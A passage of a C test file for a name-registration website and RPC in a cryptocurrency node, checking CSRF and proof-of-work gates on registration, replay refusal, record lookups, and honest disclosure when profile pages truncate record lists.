             strstr((char *)resp, "namePowSolveChunked") != NULL);

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

static int t_register_refusals(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    uint8_t resp[65536];
    size_t nb;

    /* Default-off: without the operator opt-in, POST is refused before
     * CSRF/PoW even run (public registration spends the node wallet). */
    unsetenv("ZCL_NAMES_PUBLIC_REGISTER");
    const char *any = "name=alice&type=onion&value=alice.onion";
    nb = name_site_handle_request("POST", "/names/register",
                                  (const uint8_t *)any, strlen(any),
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("public-register default-off refused",
             strstr((char *)resp, "disabled") != NULL);

    /* Opt in for the remaining gate-order checks. */
    setenv("ZCL_NAMES_PUBLIC_REGISTER", "1", 1);

    /* No CSRF token → refused before anything else. */
    const char *no_csrf = "name=alice&type=onion&value=alice.onion";
    nb = name_site_handle_request("POST", "/names/register",
                                  (const uint8_t *)no_csrf, strlen(no_csrf),
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("no-csrf refused", strstr((char *)resp, "CSRF") != NULL);

    /* Valid CSRF but no PoW → refused at the PoW gate (proves the gate fires
     * after CSRF passes). */
    char csrf[33];
    name_site_csrf_token(csrf);
    char body[256];
    snprintf(body, sizeof(body),
             "name=alice&type=onion&value=alice.onion&csrf_token=%s", csrf);
    nb = name_site_handle_request("POST", "/names/register",
                                  (const uint8_t *)body, strlen(body),
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("no-pow refused", strstr((char *)resp, "Proof-of-work") != NULL);

    /* Valid CSRF + valid PoW but a bad name → refused at validation. */
    char ts[32], nonce[32];
    solve_name_pow("BADNAME", ts, nonce); /* bind matches the submitted name */
    snprintf(body, sizeof(body),
             "name=BADNAME&type=onion&value=x.onion&csrf_token=%s"
             "&pow_ts=%s&pow_nonce=%s", csrf, ts, nonce);
    nb = name_site_handle_request("POST", "/names/register",
                                  (const uint8_t *)body, strlen(body),
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("bad-name refused", strstr((char *)resp, "Invalid name") != NULL);

    /* Full valid CSRF + PoW for a good name → reaches compose, which refuses
     * because no wallet is wired in this unit fixture. Proves the whole gate
     * chain passes end to end. */
    solve_name_pow("postname", ts, nonce);
    snprintf(body, sizeof(body),
             "name=postname&type=onion&value=post.onion&csrf_token=%s"
             "&pow_ts=%s&pow_nonce=%s", csrf, ts, nonce);
    nb = name_site_handle_request("POST", "/names/register",
                                  (const uint8_t *)body, strlen(body),
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("valid gate reaches compose (wallet not loaded)",
             strstr((char *)resp, "wallet not loaded") != NULL);

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

static int t_pow_gate_single_use(void)
{
    int failures = 0;
    char ts[32], nonce[32];
    solve_name_pow("powname", ts, nonce);

    /* First presentation verifies + claims. */
    TS_CHECK("pow accepted once",
             name_pow_verify_and_claim("powname", ts, nonce));
    /* Replay of the same solution is refused (single-use ring). */
    TS_CHECK("pow replay refused",
             !name_pow_verify_and_claim("powname", ts, nonce));
    /* Same solution bound to a DIFFERENT name never verifies (name-bound). */
    TS_CHECK("pow not portable across names",
             !name_pow_verify_and_claim("othername", ts, nonce));
    /* Malformed fields refused, not crashed. */
    TS_CHECK("pow empty refused",
             !name_pow_verify_and_claim("powname", "", ""));
    TS_CHECK("pow garbage refused",
             !name_pow_verify_and_claim("powname", "notanumber", "x"));

    return failures;
}

static int t_name_records_rpc(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    struct rpc_table t;
    rpc_table_init(&t);
    register_name_rpc_commands(&t);

    seed_name(&ndb, "recname", ZNAM_TYPE_TADDR, "t1Rec");
    db_znam_text_save(&ndb, "recname", "url", "https://rec.example");
    db_znam_addr_save(&ndb, "recname", ZNAM_TYPE_BTC, "bc1qrec");

    const struct rpc_command *cmd = rpc_table_find(&t, "name_records");
    TS_CHECK("name_records registered", cmd != NULL);

    if (cmd) {
        struct json_value params = {0}, arg = {0}, result = {0};
        json_set_array(&params);
        json_set_str(&arg, "recname");
        json_push_back(&params, &arg);
        json_free(&arg);
        bool ok = cmd->actor(&params, false, &result);
        TS_CHECK("name_records ok", ok);
        TS_CHECK("name_records found",
                 json_get_bool(json_get(&result, "found")));
        const struct json_value *texts = json_get(&result, "text_records");
        const struct json_value *addrs = json_get(&result, "address_records");
        TS_CHECK("name_records has text", texts && json_size(texts) == 1);
        TS_CHECK("name_records has addr", addrs && json_size(addrs) == 1);
        json_free(&params);
        json_free(&result);
    }

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

/* ── Record-window honesty ───────────────────────────────────────────
 *
 * The profile page renders a bounded window over a name's text/address
 * records. A visitor who sees the end of the list must be able to tell
 * whether that was everything: a page that silently drops records reads
 * as "this name carries no more", which is a fact about the window, not
 * the name. Pinned here:
 *   - more records than the window shows → an exact
 *     "Showing the first N of M" line per truncated kind;
 *   - a record set that fits entirely → no such line at all;
 *   - the uncapped model counts agree with what was seeded. */
static int t_profile_record_window(void)
{
    int failures = 0;
    sqlite3 *db = NULL;
    struct node_db ndb;
    if (!open_site_db(&db, &ndb)) return 1;
    rpc_name_set_state(&ndb);

    /* Over the window: 70 text records against the page's 64-row bound,
     * plus two address records that fit. */
    TS_CHECK("seed windowy", seed_name(&ndb, "windowy", ZNAM_TYPE_TADDR,
                                       "t1AddrProfile"));
    char key[32];
    bool seeded = true;
    for (int i = 0; i < 70; i++) {
        snprintf(key, sizeof(key), "k%03d", i);
        seeded &= db_znam_text_save(&ndb, "windowy", key, "v");
    }
    TS_CHECK("seed text batch", seeded);
    db_znam_addr_save(&ndb, "windowy", ZNAM_TYPE_BTC, "bc1qwin");
    db_znam_addr_save(&ndb, "windowy", ZNAM_TYPE_LTC, "ltc1win");
    TS_CHECK("text total honest", db_znam_text_count(&ndb, "windowy") == 70);
    TS_CHECK("addr total honest", db_znam_addr_count(&ndb, "windowy") == 2);

    uint8_t resp[65536];
    size_t nb = name_site_handle_request("GET", "/names/windowy", NULL, 0,
                                         resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("truncated page 200", strstr((char *)resp, "200 OK") != NULL);
    TS_CHECK("text truncation disclosed",
             strstr((char *)resp, "Showing the first 64 of 70 text "
                                  "records.") != NULL);
    TS_CHECK("fitting kind stays silent",
             strstr((char *)resp, "address records.</p>") == NULL);

    /* Exactly at the boundary: 64 records render whole and the page must
     * not imply a cutoff that did not happen. */
    TS_CHECK("seed edgey", seed_name(&ndb, "edgey", ZNAM_TYPE_TADDR,
                                     "t1AddrProfile"));
    seeded = true;
    for (int i = 0; i < 64; i++) {
        snprintf(key, sizeof(key), "e%03d", i);
        seeded &= db_znam_text_save(&ndb, "edgey", key, "v");
    }
    TS_CHECK("seed edge batch", seeded);
    nb = name_site_handle_request("GET", "/names/edgey", NULL, 0,
                                  resp, sizeof(resp));
    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
    TS_CHECK("boundary page 200", strstr((char *)resp, "200 OK") != NULL);
    TS_CHECK("no disclosure at the boundary",
             strstr((char *)resp, "Showing the first") == NULL);

    rpc_name_set_state(NULL);
    sqlite3_close(db);
    return failures;
}

int test_znam_site(void)
{
    int failures = 0;
    printf("\n=== znam site (resolution + register) tests ===\n");
    failures += t_resolution_precedence();
    failures += t_index_and_show();
    failures += t_register_refusals();
    failures += t_pow_gate_single_use();
    failures += t_profile_record_window();
    failures += t_name_records_rpc();
    failures += t_error_taxonomy();
    failures += t_resolve_rpc_taxonomy();
    failures += t_history_presentation();
    failures += t_gateway_off_by_default();
    failures += t_gateway_hostname_gate();
    failures += t_gateway_enabled_paths();
    failures += t_gateway_relay_is_inert();
    failures += t_gateway_caps();
    printf("znam_site: %d failures\n", failures);
    return failures;
}
